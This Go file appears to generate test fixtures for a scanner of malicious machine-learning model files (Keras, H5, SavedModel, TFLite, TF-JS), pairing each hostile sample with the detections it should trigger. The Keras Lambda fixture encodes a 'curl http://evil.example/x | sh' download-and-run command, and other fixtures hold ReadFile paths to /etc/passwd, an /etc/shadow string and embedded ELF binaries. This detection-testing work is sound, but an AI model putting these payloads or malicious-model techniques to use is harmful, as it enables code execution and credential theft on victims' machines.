package main

// TensorFlow family fixtures (plan step 7): .keras, .h5, SavedModel, TFLite,
// TF-JS and a bare checkpoint.
//
// Every byte is generated here from fixed literals, so regeneration is
// deterministic. The protobufs reuse the pb* helpers from onnx_fixtures.go (the
// wire format is the same), the zips reuse arcZip, and the TFLite files use the
// small forward flatbuffer builder below, which places each table's vtable
// immediately before the table and its children after it.

import (
	"encoding/base64"
	"sort"
)

// --- zip / h5 helpers --------------------------------------------------

// kerasMetadata is a benign Keras 3 metadata.json.
const kerasMetadata = `{"keras_version":"2.15.0","backend":"tensorflow"}`

// kerasZip builds a .keras archive: config.json, metadata.json and a minimal
// model.weights.h5 member (HDF5 magic plus padding, so the HDF5 parser has a
// real signature to see without embedding a whole model).
func kerasZip(configJSON string) []byte {
	weights := append([]byte("\x89HDF\r\n\x1a\n"), make([]byte, 56)...)
	return arcZip([]arcZipSpec{
		{name: "config.json", data: []byte(configJSON)},
		{name: "metadata.json", data: []byte(kerasMetadata)},
		{name: "model.weights.h5", data: weights},
	})
}

// h5File builds a shallow-HDF5 fixture: the signature and superblock padding,
// then the given parts (attribute names and payloads), all NUL-tolerant.
func h5File(parts ...[]byte) []byte {
	out := append([]byte("\x89HDF\r\n\x1a\n"), make([]byte, 8)...)
	for _, p := range parts {
		out = append(out, p...)
	}
	return out
}

// --- SavedModel helpers ------------------------------------------------

// tfNode builds a NodeDef with a name, an op and zero or more attribute entries.
func tfNode(name, op string, attrs ...[]byte) []byte {
	parts := [][]byte{pbStr(1, name), pbStr(2, op)}
	parts = append(parts, attrs...)
	return pbCat(parts...)
}

// tfAttr builds one entry of a NodeDef's attr map (key=1, AttrValue=2).
func tfAttr(key, stringValue string) []byte {
	// AttrValue.s is field 2.
	return pbBytes(5, pbCat(pbStr(1, key), pbBytes(2, pbStr(2, stringValue))))
}

// tfGraphDef builds a GraphDef whose node repeated field is 1.
func tfGraphDef(nodes ...[]byte) []byte {
	parts := make([][]byte, 0, len(nodes))
	for _, n := range nodes {
		parts = append(parts, pbBytes(1, n))
	}
	return pbCat(parts...)
}

// tfSavedModel wraps a GraphDef in MetaGraphDef (field 2) and SavedModel (field 1).
func tfSavedModel(graphDef []byte) []byte {
	return pbBytes(1, pbBytes(2, graphDef))
}

// tfSavedModelV2 wraps a GraphDef the way tensorflow's exporter writes it: the
// wrapper's field 1 is saved_model_schema_version (a varint) and field 2 is the
// MetaGraphDef. CoreML's probe accepts this shape (specificationVersion +
// ModelDescription), so dispatch order is what names it correctly.
func tfSavedModelV2(graphDef []byte) []byte {
	return pbCat(pbVar(1, 1), pbBytes(2, pbBytes(2, graphDef)))
}

// --- TFLite flatbuffer builder -----------------------------------------

// fbScalar is an inline scalar field.
type fbScalar struct {
	idx  int
	size int // 1 or 4
	val  uint32
}

// fbRef is a reference field (string / vector / table), emitted after the table.
type fbRef struct {
	idx  int
	emit func(*fbBuild) int
}

// fbBuild is a forward flatbuffer builder. Buffers begin with a 4-byte root
// offset placeholder and the "TFL3" identifier, as a real .tflite file does.
type fbBuild struct{ b []byte }

func newFB() *fbBuild {
	w := &fbBuild{}
	w.b = append(w.b, 0, 0, 0, 0)
	w.b = append(w.b, 'T', 'F', 'L', '3')
	return w
}

func (w *fbBuild) align(n int) {
	for len(w.b)%n != 0 {
		w.b = append(w.b, 0)
	}
}

func (w *fbBuild) put16(v uint16) { w.b = append(w.b, byte(v), byte(v>>8)) }
func (w *fbBuild) put32(v uint32) {
	w.b = append(w.b, byte(v), byte(v>>8), byte(v>>16), byte(v>>24))
}

func (w *fbBuild) patch32(off int, v uint32) {
	w.b[off] = byte(v)
	w.b[off+1] = byte(v >> 8)
	w.b[off+2] = byte(v >> 16)
	w.b[off+3] = byte(v >> 24)
}

// table emits a table plus its vtable and returns the table's position.
func (w *fbBuild) table(scalars []fbScalar, refs []fbRef) int {
	type ent struct {
		idx    int
		size   int
		scalar *fbScalar
		ref    *fbRef
	}
	maxIdx := -1
	var ents []ent
	for i := range scalars {
		s := scalars[i]
		if s.idx > maxIdx {
			maxIdx = s.idx
		}
		ents = append(ents, ent{idx: s.idx, size: s.size, scalar: &scalars[i]})
	}
	for i := range refs {
		r := refs[i]
		if r.idx > maxIdx {
			maxIdx = r.idx
		}
		ents = append(ents, ent{idx: r.idx, size: 4, ref: &refs[i]})
	}
	sort.Slice(ents, func(i, j int) bool { return ents[i].idx < ents[j].idx })
	pos := map[int]int{}
	off := 4 // the soffset lives at the table start
	for _, e := range ents {
		if rem := off % e.size; rem != 0 {
			off += e.size - rem
		}
		pos[e.idx] = off
		off += e.size
	}
	tableSize := off
	if rem := tableSize % 4; rem != 0 {
		tableSize += 4 - rem
	}
	vtSize := 4 + 2*(maxIdx+1)

	w.align(2)
	vtPos := len(w.b)
	w.put16(uint16(vtSize))
	w.put16(uint16(tableSize))
	for i := 0; i <= maxIdx; i++ {
		if p, ok := pos[i]; ok {
			w.put16(uint16(p))
		} else {
			w.put16(0)
		}
	}
	w.align(4)
	tablePos := len(w.b)
	for range tableSize {
		w.b = append(w.b, 0)
	}
	w.patch32(tablePos, uint32(int32(tablePos-vtPos)))
	for _, e := range ents {
		if e.scalar == nil {
			continue
		}
		p := tablePos + pos[e.scalar.idx]
		if e.size == 1 {
			w.b[p] = byte(e.scalar.val)
		} else {
			w.patch32(p, e.scalar.val)
		}
	}
	for _, e := range ents {
		if e.ref == nil {
			continue
		}
		child := e.ref.emit(w)
		p := tablePos + pos[e.ref.idx]
		w.patch32(p, uint32(child-p))
	}
	return tablePos
}

// vecTables emits a vector of tables.
func (w *fbBuild) vecTables(emits ...func(*fbBuild) int) int {
	w.align(4)
	base := len(w.b)
	w.put32(uint32(len(emits)))
	slotBase := len(w.b)
	for range emits {
		w.put32(0)
	}
	for i, e := range emits {
		child := e(w)
		slot := slotBase + 4*i
		w.patch32(slot, uint32(child-slot))
	}
	return base
}

// vecBytes emits a vector<ubyte>, which is also a string's representation.
func (w *fbBuild) vecBytes(data []byte) int {
	w.align(4)
	base := len(w.b)
	w.put32(uint32(len(data)))
	w.b = append(w.b, data...)
	w.align(4)
	return base
}

func (w *fbBuild) finish(root int) []byte {
	w.patch32(0, uint32(root))
	return w.b
}

// opCode builds an OperatorCode table.
func opCode(custom string, builtin uint32) func(*fbBuild) int {
	return func(w *fbBuild) int {
		var refs []fbRef
		if custom != "" {
			c := custom
			refs = append(refs, fbRef{idx: 1, emit: func(w *fbBuild) int { return w.vecBytes([]byte(c)) }})
		}
		return w.table([]fbScalar{{idx: 0, size: 1, val: 0}, {idx: 3, size: 4, val: builtin}}, refs)
	}
}

// operator builds an Operator table.
func operator(opcodeIndex uint32, customOptions []byte) func(*fbBuild) int {
	return func(w *fbBuild) int {
		var refs []fbRef
		if customOptions != nil {
			co := customOptions
			refs = append(refs, fbRef{idx: 5, emit: func(w *fbBuild) int { return w.vecBytes(co) }})
		}
		return w.table([]fbScalar{{idx: 0, size: 4, val: opcodeIndex}}, refs)
	}
}

// subGraph builds a SubGraph table.
func subGraph(ops ...func(*fbBuild) int) func(*fbBuild) int {
	return func(w *fbBuild) int {
		return w.table(nil, []fbRef{{idx: 3, emit: func(w *fbBuild) int { return w.vecTables(ops...) }}})
	}
}

// buffer builds a Buffer table.
func buffer(data []byte) func(*fbBuild) int {
	return func(w *fbBuild) int {
		var refs []fbRef
		if data != nil {
			d := data
			refs = append(refs, fbRef{idx: 0, emit: func(w *fbBuild) int { return w.vecBytes(d) }})
		}
		return w.table(nil, refs)
	}
}

// tflite builds a Model table from the given collections.
func tflite(opcodes, subgraphs, buffers []func(*fbBuild) int) []byte {
	w := newFB()
	root := w.table(
		[]fbScalar{{idx: 0, size: 4, val: 3}},
		[]fbRef{
			{idx: 1, emit: func(w *fbBuild) int { return w.vecTables(opcodes...) }},
			{idx: 2, emit: func(w *fbBuild) int { return w.vecTables(subgraphs...) }},
			{idx: 4, emit: func(w *fbBuild) int { return w.vecTables(buffers...) }},
		},
	)
	return w.finish(root)
}

// --- fixtures ----------------------------------------------------------

func tfmodelFixtures(f *fixtureSet) {
	// A Lambda layer whose embedded function carries a marshal-shaped code
	// payload (base64 of a code-object-shaped blob with a Python body). Keras
	// base64-decodes it, marshal.loads it and rebuilds a FunctionType: VU#253266
	// / CVE-2024-3660.
	lambdaCode := base64.StdEncoding.EncodeToString(
		[]byte("\x63\x00\x00\x00\x00import os\nos.system('curl http://evil.example/x | sh')\n"))
	lambdaConfig := `{"class_name":"Functional","config":{"name":"evil","layers":[` +
		`{"class_name":"InputLayer","config":{"name":"in","batch_input_shape":[null,4]}},` +
		`{"class_name":"Lambda","config":{"name":"l","function":{"class_name":"__lambda__",` +
		`"config":{"code":"` + lambdaCode + `","defaults":null,"closure":null}}}}]},` +
		`"keras_version":"2.15.0","backend":"tensorflow"}`
	f.add("keras_lambda.keras", kerasZip(lambdaConfig))

	// A TorchModuleWrapper layer: from_config hands attacker data to torch.load
	// (CVE-2026-12484).
	torchConfig := `{"class_name":"Functional","config":{"name":"wrap","layers":[` +
		`{"class_name":"InputLayer","config":{"name":"in","batch_input_shape":[null,4]}},` +
		`{"class_name":"TorchModuleWrapper","config":{"name":"t"}}]},` +
		`"keras_version":"2.15.0","backend":"tensorflow"}`
	f.add("keras_torch_wrapper.keras", kerasZip(torchConfig))

	// A class outside the safe set: the loader must resolve it from host code.
	unknownConfig := `{"class_name":"Functional","config":{"name":"u","layers":[` +
		`{"class_name":"InputLayer","config":{"name":"in","batch_input_shape":[null,4]}},` +
		`{"class_name":"EvilCustomLayer","config":{"name":"e"}}]},` +
		`"keras_version":"2.15.0","backend":"tensorflow"}`
	f.add("keras_unknown_class.keras", kerasZip(unknownConfig))

	// A benign Keras model: only Keras' own layer classes.
	benignConfig := `{"class_name":"Sequential","config":{"name":"clean","layers":[` +
		`{"class_name":"InputLayer","config":{"name":"in","batch_input_shape":[null,8]}},` +
		`{"class_name":"Dense","config":{"name":"d1","units":4,"activation":"relu"}},` +
		`{"class_name":"Dropout","config":{"name":"do","rate":0.2}},` +
		`{"class_name":"Dense","config":{"name":"out","units":2,"activation":"softmax"}}]},` +
		`"keras_version":"2.15.0","backend":"tensorflow"}`
	f.add("benign/keras_sequential.keras", kerasZip(benignConfig))

	// H5 carrying a model_config attribute with a Lambda. safe_mode is silently
	// ignored for H5 (GHSA-36rr-ww3j-vrjv).
	h5LambdaJSON := `{"class_name":"Sequential","config":{"name":"h","layers":[` +
		`{"class_name":"Lambda","config":{"name":"l","function":{"class_name":"__lambda__",` +
		`"config":{"code":null,"defaults":null,"closure":null}}}}]}}`
	f.add("h5_lambda.h5", h5File([]byte("model_config\x00"), []byte(h5LambdaJSON)))

	// H5 with an external-file-shaped path: the shallow reader cannot follow an
	// object header, so this is a low-confidence external-link report.
	f.add("h5_external_link.h5", h5File([]byte("external_link_target\x00"), []byte("/etc/shadow\x00")))

	// Benign H5 with a real Keras config and no external paths.
	h5BenignJSON := `{"class_name":"Sequential","config":{"name":"h","layers":[` +
		`{"class_name":"InputLayer","config":{"name":"in","batch_input_shape":[null,4]}},` +
		`{"class_name":"Dense","config":{"name":"d","units":2,"activation":"linear"}}]}}`
	f.add("benign/h5_model.h5", h5File([]byte("model_config\x00"), []byte(h5BenignJSON)))

	// SavedModel with a PyFunc op and a ReadFile op with an absolute path.
	savedModelBad := tfSavedModel(tfGraphDef(
		tfNode("py", "PyFunc", tfAttr("token", "myfunc")),
		tfNode("rf", "ReadFile", tfAttr("filename", "/etc/passwd")),
	))
	f.add("tf_savedmodel_bad/saved_model.pb", savedModelBad)

	// An executable and a script under the SavedModel's assets directory.
	f.add("tf_savedmodel_bad/assets/run.sh", []byte("#!/bin/sh\necho hi\n"))
	f.add("tf_savedmodel_bad/assets/libevil.so", minimalELF())

	// SavedModel in the exporter's layout: field 1 is a schema version and the
	// MetaGraphDef sits in field 2, which is what high-level saved_model.save
	// writes. Three Hub-unsafe artifacts named saved_model.pb were dispatched as
	// coreml because only field 1 was probed, so the PyFunc op was never reached.
	f.add("tf_savedmodel_v2/saved_model.pb", tfSavedModelV2(tfGraphDef(
		tfNode("payload", "EagerPyFunc", tfAttr("token", "pyfn")),
	)))

	// Benign SavedModel: ordinary ops and no file IO.
	savedModelBenign := tfSavedModel(tfGraphDef(
		tfNode("input", "Placeholder", tfAttr("dtype", "float32")),
		tfNode("mul", "Mul", tfAttr("T", "float32")),
		tfNode("out", "Identity", tfAttr("T", "float32")),
	))
	f.add("benign/tf_savedmodel/saved_model.pb", savedModelBenign)

	// A bare checkpoint index: variables only, no inline code.
	f.add("tf_checkpoint/variables.index", pbCat(pbVar(1, 1), pbVar(2, 0), pbVar(3, 0)))

	// TFLite with a custom operator code and custom_options on the operator.
	f.add("tflite_customop.tflite", tflite(
		[]func(*fbBuild) int{opCode("MyEvilPlugin", 32)},
		[]func(*fbBuild) int{subGraph(operator(0, []byte{1, 2, 3, 4}))},
		[]func(*fbBuild) int{buffer([]byte{0, 0, 0, 0, 0, 0, 0, 0})},
	))

	// TFLite with an ELF parked in a buffer.
	f.add("tflite_native.tflite", tflite(
		[]func(*fbBuild) int{opCode("", 0)},
		[]func(*fbBuild) int{subGraph(operator(0, nil))},
		[]func(*fbBuild) int{buffer(minimalELF())},
	))

	// Benign TFLite: one builtin op, no custom code, an inert buffer.
	f.add("benign/tiny.tflite", tflite(
		[]func(*fbBuild) int{opCode("", 0), opCode("", 0)},
		[]func(*fbBuild) int{subGraph(operator(0, nil), operator(1, nil))},
		[]func(*fbBuild) int{buffer([]byte{0, 0, 0, 0, 0, 0, 0, 0})},
	))

	// TF-JS model.json with a Flex op and a ReadFile path.
	tfjs := `{"format":"graph-model","generatedBy":"1.0",` +
		`"weightsManifest":[{"paths":["group1-shard1of1.bin"],"weights":[]}],` +
		`"modelTopology":{"node":[` +
		`{"name":"n1","op":"FlexAdd"},` +
		`{"name":"rf","op":"ReadFile","attr":{"filename":{"s":"../../etc/passwd"}}}]}}`
	f.add("tfjs_flex/model.json", []byte(tfjs))
}

func tfmodelExpectations() (map[string]expectation, map[string]expectation) {
	malicious := map[string]expectation{
		"keras_lambda.keras": {
			Expect: []string{"SC4N-KERAS-LAMBDA"},
			Forbid: []string{"SC4N-KERAS-CLASS-UNKNOWN", "SC4N-KERAS-STRUCT"},
			Notes: "A Lambda layer whose function config carries base64 of a marshal-shaped code " +
				"object. Keras decodes it, marshal.loads it and rebuilds a FunctionType on load: " +
				"VU#253266 / CVE-2024-3660, with the safe_mode bypasses CVE-2025-1550 and CVE-2026-12481.",
		},
		"keras_torch_wrapper.keras": {
			Expect: []string{"SC4N-KERAS-TORCH-WRAPPER"},
			Forbid: []string{"SC4N-KERAS-LAMBDA", "SC4N-KERAS-STRUCT"},
			Notes:  "TorchModuleWrapper: from_config hands attacker data to torch.load (CVE-2026-12484).",
		},
		"keras_unknown_class.keras": {
			Expect: []string{"SC4N-KERAS-CLASS-UNKNOWN"},
			Forbid: []string{"SC4N-KERAS-LAMBDA", "SC4N-KERAS-TORCH-WRAPPER", "SC4N-KERAS-STRUCT"},
			Notes: "A class outside the curated Keras safe set. The loader must supply it from host code, " +
				"which is the surface the safe_mode bypasses live behind.",
		},
		"h5_lambda.h5": {
			Expect: []string{"SC4N-KERAS-LAMBDA"},
			Forbid: []string{"SC4N-HDF5-STRUCT"},
			Notes: "model_config holds a Lambda, and Keras ignores safe_mode for H5 " +
				"(GHSA-36rr-ww3j-vrjv), so this is the .keras critical reached through the H5 loader.",
		},
		"h5_external_link.h5": {
			Expect: []string{"SC4N-HDF5-EXTERNAL-LINK"},
			Notes: "An absolute path string in HDF5 data. v1 has no object-header reader, so the string " +
				"cannot be proven to be an external-link value: the report is deliberately low confidence.",
		},
		"tf_savedmodel_v2/saved_model.pb": {
			Expect: []string{"SC4N-TF-PYFUNC"},
			Forbid: []string{"SC4N-FORMAT-EXTENSION-MISMATCH"},
			Notes: "The exporter's SavedModel wrapper: saved_model_schema_version in " +
				"field 1, MetaGraphDef in field 2, an EagerPyFunc node inside. CoreML's " +
				"probe accepts this shape, so the TensorFlow sniffer has to outrank it " +
				"and probe field 2 as a MetaGraphDef; otherwise the graph is never " +
				"walked and the artifact is reported only as an extension mismatch.",
		},
		"tf_savedmodel_bad/saved_model.pb": {
			Expect: []string{"SC4N-TF-PYFUNC", "SC4N-TF-FILE-IO"},
			Forbid: []string{"SC4N-TF-STRUCT"},
			Notes: "A SavedModel whose GraphDef has a PyFunc node and a ReadFile node with an absolute " +
				"path: the code-callback and arbitrary-file-read surfaces of a TF graph.",
		},
		"tf_savedmodel_bad/assets/run.sh": {
			Expect: []string{"SC4N-TF-ASSET-EXECUTABLE"},
			Notes: "A shell script under a SavedModel's assets/ directory; the universal layer matches it " +
				"to the sibling saved_model.pb.",
		},
		"tf_savedmodel_bad/assets/libevil.so": {
			Expect: []string{"SC4N-TF-ASSET-EXECUTABLE"},
			Notes:  "A validated ELF under a SavedModel's assets/ directory.",
		},
		"tf_checkpoint/variables.index": {
			Expect: []string{"SC4N-TF-CHECKPOINT-NO-CODE"},
			Notes: "A bare checkpoint index: the informational note records that there is no inline code " +
				"to find, so a clean verdict is not read as \"safe to load\".",
		},
		"tflite_customop.tflite": {
			Expect: []string{"SC4N-TFLITE-CUSTOM-OP"},
			Forbid: []string{"SC4N-TFLITE-NATIVE-MAGIC", "SC4N-TFLITE-STRUCT"},
			Notes: "An operator code with a custom_code name and a BuiltinOperator.CUSTOM code, plus " +
				"custom_options on the operator: the runtime must resolve the name to a loaded plugin.",
		},
		"tflite_native.tflite": {
			Expect: []string{"SC4N-TFLITE-NATIVE-MAGIC"},
			Forbid: []string{"SC4N-TFLITE-CUSTOM-OP", "SC4N-TFLITE-STRUCT"},
			Notes: "A validated ELF embedded in a TFLite buffer: native code the format has no reason to " +
				"carry.",
		},
		"tfjs_flex/model.json": {
			Expect: []string{"SC4N-TFJS-FLEX-OP", "SC4N-TF-FILE-IO"},
			Notes: "A TF-JS graph with a Flex op and a ReadFile attribute whose path escapes the model " +
				"directory.",
		},
	}
	benign := map[string]expectation{
		"benign/keras_sequential.keras": {
			Forbid: []string{"SC4N-KERAS-LAMBDA", "SC4N-KERAS-TORCH-WRAPPER", "SC4N-KERAS-CLASS-UNKNOWN", "SC4N-KERAS-STRUCT"},
			Notes:  "A Sequential model using only Keras' own layer classes, a benign metadata.json and a signature-only weights member.",
		},
		"benign/h5_model.h5": {
			Forbid: []string{"SC4N-KERAS-LAMBDA", "SC4N-KERAS-CLASS-UNKNOWN", "SC4N-HDF5-EXTERNAL-LINK", "SC4N-HDF5-STRUCT"},
			Notes:  "An H5 whose model_config is an ordinary Sequential/Dense model with no external paths.",
		},
		"benign/tf_savedmodel/saved_model.pb": {
			Forbid: []string{"SC4N-TF-PYFUNC", "SC4N-TF-FILE-IO", "SC4N-TF-STRUCT"},
			Notes:  "A SavedModel with Placeholder/Mul/Identity ops and no file IO.",
		},
		"benign/tiny.tflite": {
			Forbid: []string{"SC4N-TFLITE-CUSTOM-OP", "SC4N-TFLITE-NATIVE-MAGIC", "SC4N-TFLITE-STRUCT"},
			Notes:  "Two builtin operator codes, a two-operator subgraph and an inert buffer.",
		},
	}
	return malicious, benign
}

func init() {
	register(contributor{
		name:         "tfmodel",
		fixtures:     tfmodelFixtures,
		expectations: tfmodelExpectations,
	})
}
